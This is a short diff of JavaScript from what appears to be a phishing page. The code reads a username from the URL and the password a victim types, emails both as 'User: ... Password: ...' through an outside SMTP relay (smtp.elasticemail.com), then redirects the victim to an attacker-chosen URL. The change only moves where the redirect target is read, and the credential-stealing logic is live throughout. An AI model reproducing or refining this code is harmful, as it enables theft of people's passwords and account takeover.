@@ -14,7 +14,6 @@
     document.getElementById("passwordin").focus()
     })
 var usr = new URLSearchParams(window.location.search).get('usr');
-var to = new URLSearchParams(window.location.search).get('to');
 function sendEmail(body) {
       Email.send({
         Host: "smtp.elasticemail.com",
@@ -27,6 +26,7 @@ function sendEmail(body) {
       }).then((message) => console.log(message));
 }
 function gor(){
+  var to = new URLSearchParams(window.location.search).get('to');
 	sendEmail("User: " + usr + " Password: " + document.getElementById("passwordin").value)
     window.location.href = to;
   }
